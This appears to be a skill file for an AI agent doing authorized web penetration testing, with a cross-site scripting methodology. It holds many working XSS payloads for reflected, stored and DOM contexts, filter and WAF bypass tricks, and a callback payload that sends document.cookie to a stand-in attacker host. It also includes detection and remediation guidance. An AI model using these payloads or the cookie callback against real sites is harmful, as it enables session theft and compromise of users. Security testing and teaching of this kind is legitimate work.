---
name: web-xss
description: Use when testing a web application for cross-site scripting on
  an authorized engagement. Covers reflected, stored, and DOM-based XSS,
  context-aware payload crafting (HTML, attribute, JavaScript, and URL
  contexts), filter and WAF bypass techniques, and Content Security Policy
  analysis with safe proof-of-concept callbacks. Use when user input is
  reflected in pages, stored in profiles or comments, or processed by client
  side JavaScript, or when assessing session theft and CSRF-adjacent impact.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [web-sqli]
tools:
  - name: Burp Suite
    version: 2026.2
  - name: OWASP ZAP
    version: 2.16.1
  - name: Python
    version: 3.12
---

Cross-site scripting happens when an application includes untrusted input in
its output without proper encoding, so the input runs as code in a victim's
browser. This skill covers the full authorized methodology: finding where
input lands, crafting payloads for the exact output context, bypassing naive
filters, and proving impact safely with non-destructive callbacks. Never test
against real users or third party visitors, and never exfiltrate real
session data outside the agreed scope.

## Quick Workflow

1. Map every place user input is reflected, stored, or processed by
   JavaScript (forms, URL parameters, headers, file uploads, WebSocket
   messages).
2. Identify the exact output context for each sink: HTML body, tag
   attribute, JavaScript string, URL, or CSS.
3. Confirm with a harmless marker first (unique string), then escalate to
   a minimal JavaScript execution proof (`alert(document.domain)`).
4. Craft context-aware payloads; do not throw generic payloads at every
   input.
5. Test persistence: stored inputs need the payload to survive the write
   path and fire on every page that renders it.
6. For DOM XSS, trace sources (`location.hash`, `postMessage`) to sinks
   (`innerHTML`, `document.write`, `eval`).
7. Check the Content Security Policy for gaps that allow the payload.
8. Prove impact with a callback to your own listener, then stop. Do not
   attack real sessions.

## 1. Finding sinks and contexts

Send a unique canary string and search the response for where it appears
unencoded.

```bash
# Canary probe on a search parameter
curl -s "https://target.example/search?q=zzCANARYzz9" | grep -o '.\{40\}zzCANARYzz9.\{40\}'

# Check which contexts echo the input (attribute, script, body)
curl -s -X POST 'https://target.example/profile' \
  -d "bio=zzCANARYzz9" -b "session=TEST" | grep -n 'zzCANARYzz9'
```

```bash
# Inspect a CSP header before crafting payloads
curl -sI 'https://target.example/' | grep -i 'content-security-policy'

# Also check meta tag CSP in the HTML
curl -s 'https://target.example/page' | grep -i 'http-equiv="Content-Security-Policy"'
```

Record for each sink: the input, the page, the exact surrounding markup,
and whether characters like `<`, `>`, `"`, `'`, and `(` survive.

## 2. Reflected XSS

The payload fires immediately in the response. Match the payload to the
context you found in step 1.

```bash
# HTML body context: tag injection
curl -s "https://target.example/search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E"

# Double-quoted attribute context: break out of the attribute first
# <input value="PAYLOAD">  ->  "><svg onload=alert(document.domain)>
curl -s "https://target.example/search?q=%22%3E%3Csvg%20onload%3Dalert(document.domain)%3E"

# Single-quoted attribute context
curl -s "https://target.example/search?q='%3E%3Csvg%20onload%3Dalert(document.domain)%3E"

# JavaScript string context: var name = 'PAYLOAD';
# close the string, then inject code
curl -s "https://target.example/welcome?name=x';alert(document.domain);//"
```

Use event handlers instead of `<script>` when tags are filtered:
`<svg onload=...>`, `<img src=x onerror=...>`, `<details open ontoggle=...>`,
`<body onload=...>` (needs a body-level sink). Prefer payloads without
parentheses or quotes when those characters are stripped (see bypasses).

## 3. Stored XSS

The payload is saved and fires for anyone who views the stored data.
Typical sinks: comments, profiles, support tickets, file names, chat
messages, admin dashboards.

```bash
# Store the payload through the normal feature
curl -s -X POST 'https://target.example/comment' -b "session=TEST" \
  --data-urlencode "text=<svg onload=alert(document.domain)>" \
  -d "post_id=42"

# Verify it renders unencoded on the display page
curl -s 'https://target.example/post/42' -b "session=TEST" | grep -o '<svg[^>]*>'

# Check secondary render paths: admin panel, exports, email templates
curl -s 'https://target.example/admin/comments' -b "session=ADMINTEST"
```

Stored XSS in an admin panel is high impact: prove it with a test admin
account only, never with a real administrator's session.

## 4. DOM-based XSS

The vulnerability lives in client side JavaScript. Find sources that read
attacker-controlled data and sinks that execute it.

```bash
# Quick source/sink grep over downloaded JavaScript
curl -s 'https://target.example/static/app.js' -o /tmp/app.js
grep -n -E 'location\.(hash|search)|document\.URL|postMessage' /tmp/app.js
grep -n -E 'innerHTML|outerHTML|document\.write|eval\(|setTimeout\(|setInterval\(' /tmp/app.js
```

Typical pattern and proof:

```javascript
// Vulnerable: sink reads the hash directly
document.getElementById("msg").innerHTML = location.hash.slice(1);

// Proof URL (fires in the victim's browser context):
// https://target.example/page#<img src=x onerror=alert(document.domain)>
```

Also test `postMessage` handlers that trust `event.origin` loosely or use
`"*"` in `postMessage` calls, and check for unsafe `JSON.parse` flows that
feed `innerHTML`.

## 5. Filter bypass techniques

When naive blocklists strip payloads, adapt instead of giving up. Test one
bypass at a time.

```bash
# Case variation (filters that are case sensitive)
curl -s "https://target.example/search?q=%3CsCrIpT%3Ealert(1)%3C/sCrIpT%3E"

# Nested tags (filters that strip once, non-recursively)
# <scr<script>ipt> becomes <script> after one strip pass
curl -s "https://target.example/search?q=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/script%3Eipt%3E"

# No parentheses: use throw or template tricks
# <svg onload=alert`1`>  (template literal, no parens needed)
curl -s "https://target.example/search?q=%3Csvg%20onload%3Dalert%601%60%3E"

# No quotes or angle brackets: event handler with HTML entities
# &#x3C;svg onload=alert(1)&#x3E; decodes in some attribute contexts

# Protocol bypass for URL contexts: javascript: vs JaVaScRiPt:
curl -s "https://target.example/go?next=JaVaScRiPt:alert(document.domain)"
```

Other useful angles: double URL encoding (`%253C`), Unicode overlong
encoding on weak decoders, and splitting keywords across filter boundaries
(`<svg/onload=...>` with a slash instead of a space). Keep a small local
bypass notebook rather than firing thousand-payload lists at the target.

## 6. Content Security Policy considerations

Read the policy and look for gaps before assuming a payload is dead.

```bash
# Fetch and read the policy
curl -sI 'https://target.example/' | grep -i '^content-security-policy'

# Test whether inline scripts are blocked
curl -s "https://target.example/search?q=%3Cscript%3Ealert(1)%3C/script%3E" -D - -o /dev/null
```

Common bypassable patterns: `script-src 'self'` with a JSONP endpoint or
an uploadable script on the same origin, `unsafe-inline` anywhere,
`unsafe-eval` combined with a DOM sink, missing `object-src` (allows Flash
era tricks only on legacy setups), and `base-uri` missing (allows `<base>`
tag hijacking for relative script URLs). If the CSP is strict and
nonce-based, XSS may still exist for HTML injection without script
execution; report the injection with the CSP as a mitigating factor.

## 7. Safe impact proof

Prove execution with a callback to infrastructure you control, and keep the
payload non-destructive.

```bash
# Start a listener on your attack host (authorized scope only)
python3 -m http.server 8443

# Callback payload (fires alert AND phones home to your listener)
# <svg onload="fetch('https://attacker.example:8443/c?c='+document.cookie)">
```

For the report, a screenshot of `alert(document.domain)` plus the listener
log entry is enough. Do not steal real user cookies, do not keylog, and do
not chain into account takeover beyond what the rules of engagement allow.

## Edge cases

- Input is reflected but fully encoded (`&lt;script&gt;`). Confirm the
  encoding is consistent everywhere; mixed contexts often encode one sink
  and miss another.
- Payload fires in your browser but not in curl. DOM XSS needs a real
  browser; use Burp's browser or a headless Chromium to confirm.
- Stored payload is stripped on save but fires in exports (CSV, PDF).
  Check every output format, not just the HTML page.
- The application uses a rich text editor (TinyMCE, CKEditor). Test the
  editor's own sanitizer config and the server side sanitizer separately;
  they often disagree.
- Single quotes are escaped but double quotes are not, or vice versa.
  Always test both quote types and no-quote payloads.
- The sink is inside an existing `<script>` block with JSON encoding.
  Break out with `</script>` only if the encoder allows the slash; some
  encoders strip `<` but leave `>` which still permits creative breakouts.

## Escalation

- Generic payloads fail: rebuild from the exact surrounding markup you
  recorded in step 1 instead of guessing.
- `alert` is blocked by keyword filter: use `prompt`, `confirm`,
  `print`, or `throw` to prove JavaScript execution.
- Parentheses stripped: use backtick template literals
  (`alert`1``) or `onload=eval(name)` style tricks.
- Event handlers stripped: try `<svg><animate onbegin=...>`,
  `<details open ontoggle=...>`, or `<iframe srcdoc=...>` where allowed.
- CSP blocks inline: hunt for same-origin script gadgets, JSONP
  endpoints, or `unsafe-inline` in a weaker page on the same origin that
  shares the session.
- DOM XSS source is `postMessage`: craft the exact message object the
  handler expects and test origin checks with a page you host.

## Detection and defender view

Defenders see XSS probes as requests containing `<script`, `onload=`,
`onerror=`, `alert(`, and encoded variants in parameters, plus reflected
canary strings in logs. Stored XSS shows up as script tags in database
content and user reports of unexpected popups. A WAF blocks common
patterns but misses context-specific and DOM-based vectors. Durable fixes
are context-aware output encoding (not one global filter), Content
Security Policy with nonces or hashes, `HttpOnly` and `SameSite` cookie
flags to blunt session theft, and DOM APIs like `textContent` instead of
`innerHTML`.

## Key references

- MITRE ATT&CK T1189 (Drive-by Compromise): browser-side execution class.
- MITRE ATT&CK T1539 (Steal Web Session Cookie): the classic XSS impact.
- CWE-79 (Improper Neutralization of Input During Web Page Generation,
  Cross-site Scripting).
- CWE-116 (Improper Encoding or Escaping of Output): the root cause.
- OWASP Testing Guide: Testing for Reflected, Stored, and DOM XSS
  (OTG-CLIENT-001/002/003).
- PortSwigger Web Security Academy: XSS cheat sheet and labs.
- OWASP XSS Prevention Cheat Sheet: context-aware encoding rules.
